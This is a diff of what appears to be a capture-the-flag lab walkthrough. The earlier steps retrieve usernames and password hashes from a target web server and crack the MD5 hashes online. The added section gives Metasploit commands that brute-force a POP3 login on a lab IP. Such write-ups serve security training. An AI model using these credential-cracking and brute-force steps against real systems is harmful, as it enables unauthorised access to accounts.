@@ -19,12 +19,24 @@ Access the web server running on port 80 by visiting **htpp://<target_IP>** in t
 
 ![enum website ](https://github.com/user-attachments/assets/a5865fcc-4eea-41b2-9c8e-bc2e076cf74d)
 
-We then retrieve the list of usernames and hashed passwords and save the data to files on the local machine.
+- We then retrieve the list of usernames and hashed passwords and save the data to files on the local machine.
 
 ![Password Hashes](https://github.com/user-attachments/assets/146aeb2c-2134-4165-96c4-c5a7c91de601)
 
-Crack the MD5 hashes using hashes.com and save the results to hashcracked.txt.
+- Crack the MD5 hashes using hashes.com and save the results to hashcracked.txt.
 
 ![Hashes decrypted](https://github.com/user-attachments/assets/830dbd85-d7d7-4346-bac7-55c56c816d82)
 
+## Gaining Access 🕸️ ##
+
+- Use Metasploit module for brute forcing the POP3 service: 
+
+msfconsole
+use auxiliary/scanner/pop3/pop3_login
+set RHOSTS 10.10.110.111
+set USER_FILE username.txt
+set PASS_FILE password.txt
+exploit
+
+![set options in metasploit](https://github.com/user-attachments/assets/ecf9f1c0-aacf-4024-a540-1dfd6e234e04)
 
